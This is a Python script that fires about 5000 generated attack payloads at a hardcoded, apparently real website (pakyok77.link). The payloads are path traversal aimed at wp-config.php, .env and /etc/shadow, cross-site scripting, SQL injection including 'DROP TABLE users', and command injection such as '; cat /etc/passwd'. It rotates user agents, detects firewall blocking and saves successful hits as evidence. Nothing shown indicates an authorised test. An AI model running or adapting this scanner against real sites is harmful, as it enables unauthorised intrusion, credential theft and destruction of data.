#!/usr/bin/env python3
"""
Fast Comprehensive Payload Tester - 5000 Variations
Optimized for speed and real-time monitoring
"""

import requests
import urllib.parse
import json
import time
import random
from typing import List, Dict, Any
from datetime import datetime
import hashlib
import threading
import queue
import signal
import sys

class FastPayloadTester:
    def __init__(self, target_url: str, timeout: int = 5, max_workers: int = 3):
        self.target_url = target_url
        self.timeout = timeout
        self.max_workers = max_workers
        self.total_tests = 0
        self.successful_payloads = []
        self.blocked_count = 0
        self.error_count = 0
        self.test_log = []
        self.max_tests = 5000
        self.stop_event = threading.Event()
        
        # Progress tracking
        self.progress_lock = threading.Lock()
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        # Setup signal handler for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def signal_handler(self, signum, frame):
        print(f"\n⚠️ Received interrupt signal. Stopping tests...")
        self.stop_event.set()
    
    def generate_all_payloads(self) -> List[Dict[str, str]]:
        """Generate exactly 5000 comprehensive payloads"""
        payloads = []
        
        # LFI Payloads (2000 variations)
        lfi_files = [
            'wp-config.php', 'config.php', '.env', 'database.php',
            'etc/passwd', 'etc/shadow', 'etc/hosts', 
            'var/log/apache2/access.log', 'proc/self/environ',
            'index.php', 'admin.php', 'login.php'
        ]
        
        lfi_patterns = [
            '../', '..\\', '..//', '..\\\\',
            '..;/', '..%2f', '..%5c', '..%252f',
            '%2e%2e/', '%252e%252e/', '..../',
            '..%c0%af', '..%c1%9c', '0x2e0x2e/'
        ]
        
        # Generate LFI payloads
        for file in lfi_files:
            for pattern in lfi_patterns:
                for depth in [3, 5, 7, 10, 15]:
                    base = pattern * depth + file
                    payloads.extend([
                        {'payload': base, 'type': 'LFI', 'encoded': False},
                        {'payload': urllib.parse.quote(base), 'type': 'LFI', 'encoded': True},
                        {'payload': base + '%00', 'type': 'LFI', 'encoded': True},
                        {'payload': base + '\x00', 'type': 'LFI', 'encoded': True}
                    ])
        
        # XSS Payloads (1500 variations)
        xss_basic = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<object onkeypress=alert('XSS')>"
        ]
        
        # Generate XSS variations
        for xss in xss_basic:
            payloads.extend([
                {'payload': xss, 'type': 'XSS', 'encoded': False},
                {'payload': urllib.parse.quote(xss), 'type': 'XSS', 'encoded': True},
                {'payload': xss.upper(), 'type': 'XSS', 'encoded': False},
                {'payload': xss.lower(), 'type': 'XSS', 'encoded': False},
                {'payload': ''.join(f'&#x{ord(c):x};' for c in xss[:20]), 'type': 'XSS', 'encoded': True},
                {'payload': ''.join(f'&#{ord(c)};' for c in xss[:20]), 'type': 'XSS', 'encoded': True}
            ])
        
        # SQL Injection Payloads (1000 variations)
        sqli_basic = [
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "admin'--",
            "' OR 'x'='x", "') OR ('1'='1", "1' OR '1'='1",
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "' AND 1=1--", "' AND 1=2--", "'; DROP TABLE users--",
            "' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--",
            "' WAITFOR DELAY '00:00:05'--", "1; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "1' UNION SELECT NULL--"
        ]
        
        for sqli in sqli_basic:
            for encoding in [False, True]:
                payload_val = urllib.parse.quote(sqli) if encoding else sqli
                payloads.extend([
                    {'payload': payload_val, 'type': 'SQLi', 'encoded': encoding},
                    {'payload': payload_val.upper(), 'type': 'SQLi', 'encoded': encoding},
                    {'payload': payload_val + '%00', 'type': 'SQLi', 'encoded': True}
                ])
        
        # Command Injection Payloads (500 variations)
        cmdi_basic = [
            "; ls -la", "| ls -la", "&& ls -la", "|| ls -la",
            "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
            "; whoami", "| whoami", "&& whoami", "; id", "| id", "&& id",
            "`ls -la`", "$(ls -la)", "`whoami`", "$(whoami)", "`id`", "$(id)",
            "; ping -c 4 127.0.0.1", "| ping -c 4 127.0.0.1"
        ]
        
        for cmdi in cmdi_basic:
            payloads.extend([
                {'payload': cmdi, 'type': 'CMDi', 'encoded': False},
                {'payload': urllib.parse.quote(cmdi), 'type': 'CMDi', 'encoded': True},
                {'payload': cmdi.replace(' ', '${IFS}'), 'type': 'CMDi', 'encoded': False}
            ])
        
        # Shuffle and ensure exactly 5000 payloads
        random.shuffle(payloads)
        
        if len(payloads) > self.max_tests:
            payloads = payloads[:self.max_tests]
        elif len(payloads) < self.max_tests:
            # Duplicate to reach 5000
            while len(payloads) < self.max_tests:
                needed = self.max_tests - len(payloads)
                payloads.extend(payloads[:min(len(payloads), needed)])
        
        return payloads[:self.max_tests]
    
    def check_success(self, payload_info: Dict[str, str], response: requests.Response) -> bool:
        """Check if payload was successful"""
        if response.status_code != 200:
            return False
            
        payload = payload_info['payload']
        payload_type = payload_info['type']
        response_text = response.text.lower()
        
        # Check for blocking first
        if any(block in response_text for block in [
            'cloudflare', 'blocked', 'forbidden', 'access denied',
            'security', 'firewall', 'waf', 'protection'
        ]):
            return False
        
        # Type-specific success detection
        if payload_type == 'LFI':
            indicators = [
                'db_password', 'db_host', 'db_name', 'define(',
                'root:x:0:0', 'www-data:x:', '/bin/bash', '/bin/sh',
                'path=', 'home=', '<?php', 'get /', 'post /'
            ]
            return sum(1 for ind in indicators if ind in response_text) >= 2
            
        elif payload_type == 'XSS':
            decoded = urllib.parse.unquote(payload) if payload_info['encoded'] else payload
            if decoded.lower() in response_text:
                return any(ctx in response_text for ctx in [
                    '<script', 'javascript:', 'onerror=', 'onload=', 'alert('
                ])
            return False
            
        elif payload_type == 'SQLi':
            return any(err in response_text for err in [
                'mysql_fetch', 'mysql_error', 'warning: mysql',
                'postgresql', 'ora-', 'microsoft ole db', 'sql syntax'
            ])
            
        elif payload_type == 'CMDi':
            return any(cmd in response_text for cmd in [
                'uid=', 'gid=', 'total ', 'drwx', '-rw-', 'root:x:0:0'
            ])
        
        return False
    
    def test_single_payload(self, endpoint: str, param: str, payload_info: Dict[str, str]) -> Dict[str, Any]:
        """Test a single payload"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        }
        
        url = f"{self.target_url}/{endpoint}"
        payload = payload_info['payload']
        
        result = {
            'test_number': 0,  # Will be set later
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'parameter': param,
            'payload': payload,
            'payload_type': payload_info['type'],
            'payload_encoded': payload_info['encoded'],
            'status_code': None,
            'response_length': 0,
            'response_time': 0,
            'blocked': False,
            'success': False,
            'error': None
        }
        
        try:
            start_time = time.time()
            
            # Randomly choose GET or POST
            if random.choice([True, False]):
                response = requests.get(url, params={param: payload}, 
                                      headers=headers, timeout=self.timeout)
            else:
                response = requests.post(url, data={param: payload}, 
                                       headers=headers, timeout=self.timeout)
            
            result['response_time'] = round(time.time() - start_time, 3)
            result['status_code'] = response.status_code
            result['response_length'] = len(response.text)
            
            # Check for blocking
            response_lower = response.text.lower()
            result['blocked'] = any(block in response_lower for block in [
                'cloudflare', 'blocked', 'forbidden', 'access denied'
            ])
            
            # Check for success
            result['success'] = self.check_success(payload_info, response)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def worker_thread(self, work_queue: queue.Queue, result_queue: queue.Queue):
        """Worker thread for testing payloads"""
        endpoints = [
            ('index.php', 'page'), ('index.php', 'file'), ('index.php', 'include'),
            ('search.php', 'q'), ('login.php', 'username'), ('admin.php', 'id'),
            ('view.php', 'id'), ('download.php', 'file'), ('contact.php', 'message')
        ]
        
        while not self.stop_event.is_set():
            try:
                payload_info = work_queue.get(timeout=1)
                if payload_info is None:  # Sentinel value
                    break
                
                endpoint, param = random.choice(endpoints)
                result = self.test_single_payload(endpoint, param, payload_info)
                result_queue.put(result)
                work_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Worker error: {e}")
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive testing with 5000 payloads"""
        print("🚀 Starting Fast Comprehensive Payload Testing - 5000 Variations")
        print("=" * 80)
        print(f"Target: {self.target_url}")
        print(f"Max Tests: {self.max_tests}")
        print(f"Workers: {self.max_workers}")
        print(f"Start Time: {datetime.now()}")
        print("=" * 80)
        
        # Generate payloads
        print("📝 Generating 5000 payloads...")
        all_payloads = self.generate_all_payloads()
        
        # Count by type
        type_counts = {}
        for p in all_payloads:
            type_counts[p['type']] = type_counts.get(p['type'], 0) + 1
        
        print(f"📊 Generated {len(all_payloads)} payloads:")
        for ptype, count in type_counts.items():
            print(f"   {ptype}: {count} payloads")
        
        print("\n🔥 Starting multi-threaded testing...")
        print("Press Ctrl+C to stop gracefully")
        print()
        
        # Setup queues
        work_queue = queue.Queue()
        result_queue = queue.Queue()
        
        # Add all payloads to work queue
        for payload_info in all_payloads:
            work_queue.put(payload_info)
        
        # Start worker threads
        workers = []
        for i in range(self.max_workers):
            worker = threading.Thread(target=self.worker_thread, 
                                    args=(work_queue, result_queue))
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        # Process results
        completed_tests = 0
        start_time = time.time()
        last_progress_time = start_time
        
        while completed_tests < self.max_tests and not self.stop_event.is_set():
            try:
                result = result_queue.get(timeout=1)
                completed_tests += 1
                
                with self.progress_lock:
                    result['test_number'] = completed_tests
                    self.total_tests = completed_tests
                    self.test_log.append(result)
                    
                    if result['blocked']:
                        self.blocked_count += 1
                    if result['error']:
                        self.error_count += 1
                    if result['success']:
                        self.successful_payloads.append(result)
                        print(f"\n🎯 SUCCESS FOUND! Test #{completed_tests}")
                        print(f"   Type: {result['payload_type']}")
                        print(f"   Payload: {result['payload'][:80]}...")
                        print(f"   URL: {result['url']}?{result['parameter']}=...")
                        print(f"   Status: {result['status_code']}")
                        print("-" * 60)
                
                # Progress update every 100 tests or 30 seconds
                current_time = time.time()
                if (completed_tests % 100 == 0 or 
                    current_time - last_progress_time > 30):
                    
                    elapsed = current_time - start_time
                    rate = completed_tests / elapsed if elapsed > 0 else 0
                    eta = (self.max_tests - completed_tests) / rate if rate > 0 else 0
                    
                    print(f"Progress: {completed_tests}/{self.max_tests} "
                          f"({completed_tests/self.max_tests*100:.1f}%)")
                    print(f"Rate: {rate:.1f} tests/sec, ETA: {eta/60:.1f} minutes")
                    print(f"Success: {len(self.successful_payloads)}, "
                          f"Blocked: {self.blocked_count}, Errors: {self.error_count}")
                    print("-" * 60)
                    
                    last_progress_time = current_time
                
                result_queue.task_done()
                
            except queue.Empty:
                continue
        
        # Stop workers
        for _ in workers:
            work_queue.put(None)  # Sentinel value
        
        for worker in workers:
            worker.join(timeout=5)
        
        return self.generate_final_report()
    
    def generate_final_report(self) -> Dict[str, Any]:
        """Generate final report"""
        report = {
            'summary': {
                'total_tests_conducted': self.total_tests,
                'max_tests_planned': self.max_tests,
                'tests_completed': self.total_tests >= self.max_tests,
                'successful_payloads_found': len(self.successful_payloads),
                'blocked_requests': self.blocked_count,
                'error_requests': self.error_count,
                'success_rate': (len(self.successful_payloads) / self.total_tests * 100) if self.total_tests > 0 else 0,
                'block_rate': (self.blocked_count / self.total_tests * 100) if self.total_tests > 0 else 0,
                'end_time': datetime.now().isoformat()
            },
            'successful_payloads': self.successful_payloads,
            'test_log': self.test_log[-100:]  # Keep last 100 for space
        }
        return report
    
    def save_results(self, report: Dict[str, Any]) -> str:
        """Save results to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"fast_payload_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return filename
    
    def print_final_summary(self, report: Dict[str, Any]):
        """Print final summary"""
        print("\n" + "=" * 80)
        print("🏁 FAST COMPREHENSIVE PAYLOAD TESTING COMPLETED")
        print("=" * 80)
        
        summary = report['summary']
        
        print(f"📊 FINAL STATISTICS:")
        print(f"   Total Tests Conducted: {summary['total_tests_conducted']}")
        print(f"   Tests Planned: {summary['max_tests_planned']}")
        print(f"   Tests Completed: {'✅ YES' if summary['tests_completed'] else '❌ NO'}")
        print(f"   Successful Payloads: {summary['successful_payloads_found']}")
        print(f"   Blocked Requests: {summary['blocked_requests']}")
        print(f"   Error Requests: {summary['error_requests']}")
        print(f"   Success Rate: {summary['success_rate']:.2f}%")
        print(f"   Block Rate: {summary['block_rate']:.2f}%")
        
        if summary['successful_payloads_found'] > 0:
            print(f"\n🎯 SUCCESSFUL PAYLOADS FOUND:")
            for i, result in enumerate(report['successful_payloads'], 1):
                print(f"   {i}. Test #{result['test_number']}")
                print(f"      Type: {result['payload_type']}")
                print(f"      Payload: {result['payload'][:80]}...")
                print(f"      URL: {result['url']}?{result['parameter']}=...")
                print(f"      Status: {result['status_code']}")
                print(f"      Response Length: {result['response_length']} bytes")
                print()
        else:
            print(f"\n❌ NO SUCCESSFUL PAYLOADS FOUND")
            print(f"   All {summary['total_tests_conducted']} payload variations were blocked or failed.")
        
        print("=" * 80)

def main():
    target_url = "https://pakyok77.link"
    
    print("🔥 FAST COMPREHENSIVE PAYLOAD TESTER")
    print("Testing 5000 payload variations with multi-threading")
    print("Enhanced for speed and real-time monitoring")
    print()
    
    tester = FastPayloadTester(target_url, timeout=5, max_workers=3)
    
    try:
        # Run testing
        report = tester.run_comprehensive_test()
        
        # Save results
        filename = tester.save_results(report)
        print(f"\n💾 Results saved to: {filename}")
        
        # Print summary
        tester.print_final_summary(report)
        
        # Save evidence
        evidence_filename = f"fast_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(evidence_filename, 'w', encoding='utf-8') as f:
            f.write("FAST PAYLOAD TESTING EVIDENCE\n")
            f.write("=" * 50 + "\n")
            f.write(f"Target: {target_url}\n")
            f.write(f"Total Tests: {tester.total_tests}\n")
            f.write(f"Successful: {len(tester.successful_payloads)}\n")
            f.write(f"Blocked: {tester.blocked_count}\n")
            f.write(f"Errors: {tester.error_count}\n\n")
            
            if tester.successful_payloads:
                f.write("SUCCESSFUL PAYLOADS:\n")
                f.write("-" * 30 + "\n")
                for i, success in enumerate(tester.successful_payloads, 1):
                    f.write(f"{i}. Type: {success['payload_type']}\n")
                    f.write(f"   Payload: {success['payload']}\n")
                    f.write(f"   URL: {success['url']}?{success['parameter']}=...\n")
                    f.write(f"   Status: {success['status_code']}\n\n")
            
            f.write("SAMPLE TEST LOG (Last 50):\n")
            f.write("-" * 30 + "\n")
            for entry in tester.test_log[-50:]:
                f.write(f"Test #{entry['test_number']}: [{entry['payload_type']}] ")
                f.write(f"Status: {entry['status_code']}, Success: {entry['success']}\n")
        
        print(f"📋 Evidence file saved to: {evidence_filename}")
        
    except KeyboardInterrupt:
        print(f"\n⚠️ Testing interrupted by user at test #{tester.total_tests}")
        if tester.successful_payloads:
            print(f"Found {len(tester.successful_payloads)} successful payloads before interruption")
    except Exception as e:
        print(f"\n❌ Error during testing: {e}")

if __name__ == "__main__":
    main()